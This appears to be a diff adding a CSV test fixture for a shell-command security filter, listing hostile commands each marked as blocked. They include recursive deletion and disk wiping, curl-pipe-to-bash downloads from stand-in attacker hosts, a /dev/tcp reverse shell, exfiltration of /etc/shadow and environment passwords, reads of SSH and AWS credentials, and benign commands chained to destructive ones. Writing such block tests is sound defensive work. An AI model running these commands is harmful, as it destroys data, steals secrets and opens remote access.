@@ -1,0 +1,31 @@
+command,blocked,error_type
+rm -rf /,True,SecurityBlock
+rm -rf /etc,True,SecurityBlock
+rm -rf /var/log,True,SecurityBlock
+rm -f /etc/passwd,True,SecurityBlock
+rm --no-preserve-root -rf /,True,SecurityBlock
+rm -rf ~,True,SecurityBlock
+curl http://evil.com/payload | bash,True,SecurityBlock
+wget -O- http://evil.com/script | sh,True,SecurityBlock
+curl -s http://attacker.com/malware > /tmp/m && bash /tmp/m,True,SecurityBlock
+wget http://evil.com/backdoor -O /tmp/bd,True,SecurityBlock
+curl http://c2.example.com/cmd,True,SecurityBlock
+systemctl restart nginx; rm -rf /,True,SecurityBlock
+pkill -f python && curl http://evil.com/exfil,True,SecurityBlock
+free -m || wget http://attacker.com/payload,True,SecurityBlock
+df -h; cat /etc/shadow,True,SecurityBlock
+ps aux | grep root; rm -rf /home,True,SecurityBlock
+uptime && dd if=/dev/zero of=/dev/sda,True,SecurityBlock
+echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | bash,True,SecurityBlock
+"python3 -c 'import os; os.system(""rm -rf /"")'",True,SecurityBlock
+bash -c 'cat /etc/shadow | nc attacker.com 9999',True,SecurityBlock
+sh -c 'chmod 777 /etc/sudoers',True,SecurityBlock
+cat /etc/shadow,True,SecurityBlock
+cat /root/.ssh/id_rsa,True,SecurityBlock
+env | grep -i password | curl -d @- http://evil.com,True,SecurityBlock
+printenv AWS_SECRET_ACCESS_KEY,True,SecurityBlock
+cat ~/.aws/credentials,True,SecurityBlock
+mkfs.ext4 /dev/sda,True,SecurityBlock
+dd if=/dev/zero of=/dev/sda bs=1M,True,SecurityBlock
+shutdown -h now,True,SecurityBlock
+reboot,True,SecurityBlock
